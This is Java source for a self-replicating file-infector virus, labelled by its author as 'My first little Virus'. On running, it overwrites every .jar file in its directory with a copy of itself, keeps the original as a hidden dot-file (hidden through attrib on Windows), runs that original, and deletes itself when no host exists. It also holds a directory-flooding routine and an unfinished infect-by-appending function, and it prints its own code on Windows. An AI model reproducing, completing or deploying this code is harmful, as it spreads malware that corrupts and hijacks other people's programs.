/**
 * My first little Virus in Java
 * Aus der Schwärze der Knechtschaft durch blutige Schlachten ans goldene Licht der Freiheit.
 *
 * @author R3s1stanc3
 * @version 0.9
 */
 
import java . io . * ;
import java . lang . String ;
 
public class Main
{
   
    private static String splitStr = "abcdefg" ; // not in use now
   
    /**
     * The main function of the Virus, which starts the whole payload
     */
    public static void main ( String [ ] args )
    {
       
        Virii virii = new Virii ( ) ;
        String myself = virii . getName ( ) ;
        String os = virii . getOS ( ) ;
       
        // Get a list of all *.jar files in the current directory
        String [ ] jarList = virii . listJar ( ) ;
       
        // Replace every *.jar file with a copy of myselfFile myFile = new File ( myself ) ;
        for ( String s : jarList )
        {
            if ( ! s . equals ( myself ) && s . indexOf ( "." ) != 0 )
            {
                virii . copyFile ( s, "." + s ) ;
                virii . copyFile ( myself, s ) ;
                if ( os . equals ( "Windows" ) ) virii . hideFile ( "." + s ) ;
            }
        }
       
        // Prints his own main function
        if ( os . equals ( "Windows" ) )
        {
            virii . writeFile ( "a.txt", virii . getMyCode ( ) ) ;
            new Print ( ) . print ( "a.txt" ) ;
            virii . deleteFile ( "a.txt" ) ;
        }
           
        // If there is an infected file -> execute it; else delete yourself
        if ( virii . existsFile ( "." + myself ) ) virii . execute ( "." + myself ) ;
        else virii . deleteFile ( myself ) ;
       
    }
   
}
 
 
 
 
 
/**
 * This class contains all funktions of the virus
 *
 * @author R3s1stanc3
 * @version 0.9
 */
 
import java . io . * ;
import java . util . Random ;
import java . lang . * ;
 
public class Virii
{
 
    private static String myCode =
        "public class Main\n" +
        "{\n" +
        "    public static void main ( String [ ] args )\n" +
        "    {\n" +
        "        Virii virii = new Virii ( ) ;\n" +
        "        String myself = virii . getName ( ) ;\n" +
        "        String os = virii . getOS ( ) ;\n" +
        "        String [ ] jarList = virii . listJar ( ) ;\n" +
        "        for ( String s : jarList )\n" +
        "        {\n" +
        "            if ( ! s . equals ( myself ) && s . indexOf ( \".\" ) != 0 )\n" +
        "            {\n" +
        "                virii . copyFile ( s, \".\" + s ) ;\n" +
        "                virii . copyFile ( myself, s ) ;\n" +
                "                if ( os . equals ( \"Windows\" ) ) virii . hideFile ( \".\" + s ) ;\n" +
        "            }\n" +
        "        }\n" +
        "        if ( os . equals ( \"Windows\" ) ) \n" +
        "        {\n" +
        "           virii . writeFile ( \"a.txt\", virii . getMyCode ( ) ) ;\n" +
        "           new Print ( ) . print ( \"a.txt\" ) ;\n" +
        "           virii . deleteFile ( \"a.txt\" ) ;\n" +
        "        }\n" +
        "        if ( virii . existsFile ( \".\" + myself ) ) virii . execute ( \".\" + myself ) ) ;\n" +
        "        else virii . deleteFile ( myself ) ;\n" +
        "    }\n" +
        "}" ;
   
 
    /**
     * Function to get the file name of the running file
     * @return Filename as String
     */
    public String getName ( )
    {
       
        String filename = new File ( this . getClass ( ) . getProtectionDomain ( ) . getCodeSource ( ) . getLocation ( ) . getPath ( ) ) . getName ( ) ;
        //filename = filename . indexOf ( "." ) > -1 ? ( filename . substring ( 0, filename . lastIndexOf ( "." ) ) ) : ( filename ) ;
        if ( filename . indexOf ( "." ) > -1 )
             filename = filename . substring ( 0, filename . lastIndexOf ( "." ) ) ;
        else
            filename = filename ;
        return filename + ".jar" ;
       
    }
   
    /**
     * Floods the current directory with files
     * The files are named with random Integers and filled with rand Integers too
     * @param number Number of files to flood
     */
    public void flood ( int number )
    {
       
        FileOutputStream out ;
        PrintStream p ;
        Random rand = new Random ( ) ;
       
        try
        {
            for ( int i = 0; i < number; i ++ )
            {
                Integer j = new Integer ( rand . nextInt ( ) ) ;
                out = new FileOutputStream ( j . toString ( ) ) ;
                p = new PrintStream ( out ) ;
           
                p . println ( rand . nextInt ( ) ) ;
           
                p . close ( ) ;
            }
        }
        catch ( Exception e ) { }
       
    }
   
    /**
     * Creates a directory
     * @param name Name of the directory
     */
    public void createDir ( String name )
    {
       
        boolean dir = new File ( name ) . mkdir ( ) ;
       
    }
   
    /**
     * Lists all *.jar files in the current directory
     * @return String Array with all file names
     */
    public String [ ] listJar ( )
    {
       
        File dir = new File ( "./" ) ;
        String [ ] fileList = dir . list ( new FilenameFilter ( )
        {
            public boolean accept ( File d, String name )
            {
                return name . endsWith ( ".jar" ) ;
            }
        } ) ;
        return fileList ;
       
    }
   
    /**
     * Copies a file to a destination
     * @param source Name of the source file
     * @param dest Name of the destination file
     */
    public void copyFile ( String source, String dest )
    {
       
        try
        {
            File f1 = new File ( source ) ;
            File f2 = new File ( dest ) ;
           
            InputStream in = new FileInputStream ( f1 ) ;
            OutputStream out = new FileOutputStream ( f2 ) ;
           
            byte [ ] buf = new byte [ 1024 ] ;
            int len ;
           
            while ( ( len = in . read ( buf ) ) > 0 )
            {
                out . write ( buf, 0, len ) ;
            }
           
            in . close ( ) ;
            out . close ( ) ;
            f2 . setExecutable ( true ) ;
            System . out . println ( "copied \n" + source + " to \n" + dest + "!" ) ;
        }
        catch ( FileNotFoundException ex ) { }
        catch ( IOException e ) { }
 
    }
   
    public String getOS ( )
    {
       
        if ( System.getProperty("os.name") . indexOf ( "Lin" ) != -1 ) return "Linux" ;
        else if ( System.getProperty("os.name") . indexOf ( "Win" ) != -1 ) return "Windows" ;
        else return null ;
       
    }
   
    /**
     * Executes a file (I found the code on the internet)
     * @param file Name of the file to execute
     */
    public void execute ( String file )
    {
       
        try
        {
           
            Process p = null;
            ProcessBuilder pb = new ProcessBuilder ( "./" + file ) ;
            p = pb . start ( ) ;
           
            InputStream in = null ;
            OutputStream outS = null ;
           
            StringBuffer commandResult = new StringBuffer ( ) ;
            String line = null ;
            int readInt ;
           
            int returnVal = p . waitFor ( ) ;
           
            in = p . getInputStream ( ) ;
           
            while ( ( readInt = in . read ( ) ) != -1 )
                commandResult . append ( ( char ) readInt ) ;
            outS = ( BufferedOutputStream ) p . getOutputStream ( ) ;
            outS . close ( ) ;
           
            System . out . println ( commandResult . toString ( ) ) ;
            in . close ( ) ;
 
           
        }
        catch ( Exception e ) { }
       
    }
   
    /**
     * Used to split an infected file using a splitstring; not in use; but it works (tested with textfiles)
     * @param file File to split
     * @param splitStr The splitstring
     * @return The to parts of the file in a Stringarray
     */
    public String [ ] getOldFile ( String file, String splitStr )
    {
       
        try
        {
            StringBuffer fileData = new StringBuffer ( 1000 ) ;
            BufferedReader reader = new BufferedReader ( new FileReader ( file ) ) ;
            char [ ] buf = new char [ 1024 ] ;
            int numRead = 0 ;
            while ( ( numRead = reader . read ( buf ) ) != -1 )
            {
                String readData = String . valueOf ( buf, 0, numRead ) ;
                fileData . append ( readData ) ;
                buf = new char [ 1024 ] ;
            }
            reader.close();
           
            String data = fileData . toString ( ) ;
            String [ ] splited ;
            splited = data . split ( splitStr ) ;
            return splited ;
           
        }
        catch ( Exception e ) { return null ; }
       
    }  
   
    /**
     * Writes a String to a file
     * @param fi File to write to
     * @param data String to write in the file
     */
    public void writeFile ( String fi, String data )
    {
       
        try
        {
            File file = new File ( fi ) ;
            FileWriter fw = new FileWriter ( file ) ;
            fw . write ( data ) ;
            fw . flush ( ) ;
            fw . close ( ) ;
        }
        catch ( Exception e ) { }
       
    }
   
    /**
     * Reads the content of a file
     * @param name Name of the file
     * @return The files content as String
     */
    public String readFile ( String name )
    {
       
        try
        {
            RandomAccessFile file = new RandomAccessFile ( name, "r" ) ;
            byte [ ] data = new byte [ ( int ) file . length ( ) ] ;
           
            file . read ( data ) ;
           
            file . close ( ) ;
           
            return new String ( data ) ;
        }
        catch ( Exception e ) { return null ; }
       
    }
   
    /**
     * Should combine two files with a splitstring in between; doesn't work; not in use; Second file will be executed when executed. - Special thanks to ringi
     * @param file Name of the file
     * @param split Splitstring between hostfile and infected file
     */
    public void infectFile ( String file, String split )
    {
       
        try
        {
            RandomAccessFile data1 = new RandomAccessFile ( "." + file, "r" ) ;
            RandomAccessFile data2 = new RandomAccessFile ( file, "r" ) ;
           
            byte [ ] byte1 = new byte [ ( int ) data1.length ( ) ] ;
            byte [ ] byte2 = new byte [ ( int ) data2.length ( ) ] ;
            byte [ ] splitBytes = new byte [ split . length ( ) ] ;
            byte [ ] both = new byte [ split . length ( ) + byte1 . length + byte2 . length ] ;
           
            splitBytes = split . getBytes ( ) ;
           
            data1.read ( byte1 ) ;
            data2.read ( byte2 ) ;
            data1.close ( ) ;
            data2.close ( ) ;
           
            both = concat ( byte1, splitBytes, byte2 ) ;
           
            RandomAccessFile newFile = new RandomAccessFile ( file, "rw" ) ;
            newFile . write ( both ) ;
            newFile . close ( ) ;
        }
        catch ( Exception e ) { }
       
    }
   
    /**
     * Connects 3 Bytearrays to one - Special thanks to ringi
     * @param A first Bytearray
     * @param B second Bytearray
     * @param C third Bytearray
     * @return The big byte array
     */
    public byte [ ] concat ( byte [ ] A, byte [ ] B, byte [ ] C )
    {
       
        byte [ ] D = new byte [ A . length + B . length + C . length ] ;
        System . arraycopy ( A, 0, D, 0, A . length ) ;
        System . arraycopy ( B, 0, D, A . length, B . length ) ;
        System . arraycopy ( C, 0, D, A . length + B . length, C . length ) ;
        return D ;
       
    }
   
    /**
     * Deletes a file
     * @param file File to delete
     */
    public void deleteFile ( String file )
    {
       
        ( new File ( file ) ) . delete ( ) ;
       
    }
   
    /**
     * Hides a file under windows
     * @param fileName File to hide
     */
    public void hideFile ( String fileName )
    {
       
        try
        {
            Runtime . getRuntime ( ) . exec ( new String [ ] { "cmd", "/c", "attrib", "+H", "." + fileName } ) ;
        }
        catch ( Exception e ) { }
       
    }
   
    /**
     * Checks if a file exists
     * @param file File to check
     * @return true: exists; false: does not exist
     */
    public boolean existsFile ( String file )
    {
       
        return ( new File ( file ) ) . exists ( ) ;
       
    }
   
    /**
     * Checks if a file is infected
     * @param data The content of the file
     * @param splitStr The splitstring
     * @return true: is infected; false: is not infected
     */
    public boolean isInfected ( String data, String splitStr )
    {
       
        return ( data . split ( splitStr ) . length ) > 1 ;
       
    }
   
    public String getMyCode ( )
    {
       
        return myCode ;
       
    }
   
}
 
 
 
 
 
/**
 * This class prints a file ( only for Windows )
 *
 * @author R3s1stanc3
 * @version 1.0
 */
 
import java . awt . Desktop ;
import java . io . * ;
 
public class Print
{
   
    /**
     * Prints a file on a Windows System
     * @param file Name of the file to print
     */
    public void print ( String file )
    {
           
        try
        {
            Desktop desktop = null ;
            if ( Desktop . isDesktopSupported ( ) )
            {
                desktop = Desktop . getDesktop ( ) ;
            }
            desktop . print ( new File ( file ) ) ;
        }
        catch ( UnsupportedOperationException e ) { }
        catch ( Exception ex ) { }
 
    }
 
}
 
 
